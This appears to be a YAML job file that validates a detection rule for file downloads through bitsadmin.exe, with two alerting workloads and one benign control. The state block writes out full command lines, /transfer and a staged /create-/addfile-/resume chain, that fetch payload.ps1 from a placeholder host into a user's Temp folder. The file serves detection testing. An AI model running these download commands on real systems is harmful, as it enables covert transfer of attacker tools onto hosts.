type: job
name: BITSAdmin Download File
detection:
  source: escu
  name: "ESCU - BITSAdmin Download File - Rule"
  id: 80630ff4-8e4c-11eb-aab5-acde48001122
description: |
  Validates detection of file downloads via bitsadmin.exe. Two attack
  workloads fire on the download verbs -- /transfer (direct) and /addfile
  (staged into a BITS job); a benign /list control downloads nothing and
  must not fire.
mitre:
  tactics: [command-and-control, defense-evasion]
  techniques: [T1105, T1197]
tags: [ingress-tool-transfer, bits-jobs, darkside, living-off-the-land, flax-typhoon, gozi, scattered-spider, apt37, ghostredirector, hellcat]

state:
  domain_short:        CORP
  domain_tld:          local
  domain_short_lower:  fn.lower(ref.domain_short)
  domain_fqdn:         "${ref.domain_short_lower}.${ref.domain_tld}"
  computer:            gen.hostname(class=windows-workstation, domain=ref.domain_fqdn)
  username:            gen.username()
  user:                "${ref.domain_short}\\${ref.username}"
  bits_job:            UpdateJob
  payload_url:         "https://downloads.example.net/pkg/payload.ps1"
  temp_dir:            "C:\\Users\\${ref.username}\\AppData\\Local\\Temp"

  # direct download: /transfer fetches the remote file in one command
  transfer_command_line:  "bitsadmin.exe  /transfer /Download /priority Foreground ${ref.payload_url} ${ref.temp_dir}\\payload.ps1"
  transfer_parent:        '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground ${ref.payload_url} %temp%\payload.ps1"'

  # staged download: /addfile attaches a download URL to a created job
  addfile_command_line:   "bitsadmin.exe  /addfile ${ref.bits_job} ${ref.payload_url} ${ref.temp_dir}\\payload.ps1"
  addfile_parent:         '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /create ${ref.bits_job} & bitsadmin.exe /addfile ${ref.bits_job} ${ref.payload_url} %temp%\payload.ps1 & bitsadmin.exe /resume ${ref.bits_job} & timeout 5 & bitsadmin.exe /complete ${ref.bits_job}"'

  # enumeration only: /list downloads nothing
  list_command_line:      "bitsadmin.exe  /list /allusers /verbose"
  list_parent:            '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /list /allusers /verbose"'

workloads:
  - scenario: scenarios/windows/sysmon/process-create/bitsadmin-download-file
    bindings:
      domain_short:        ref.domain_short
      domain_tld:          ref.domain_tld
      computer:            ref.computer
      username:            ref.username
      user:                ref.user
      command_line:        ref.transfer_command_line
      parent_command_line: ref.transfer_parent
    expectation:
      expected: alert
      summary: "bitsadmin /transfer downloads a remote file directly and fires the detection"

  - scenario: scenarios/windows/sysmon/process-create/bitsadmin-download-file
    bindings:
      domain_short:        ref.domain_short
      domain_tld:          ref.domain_tld
      computer:            ref.computer
      username:            ref.username
      user:                ref.user
      command_line:        ref.addfile_command_line
      parent_command_line: ref.addfile_parent
    expectation:
      expected: alert
      summary: "bitsadmin /addfile stages a download URL into a BITS job and fires the detection"

  - scenario: scenarios/windows/sysmon/process-create/bitsadmin-download-file
    bindings:
      domain_short:        ref.domain_short
      domain_tld:          ref.domain_tld
      computer:            ref.computer
      username:            ref.username
      user:                ref.user
      command_line:        ref.list_command_line
      parent_command_line: ref.list_parent
    expectation:
      expected: none
      summary: "bitsadmin /list only enumerates existing jobs and downloads nothing, so it must not fire"
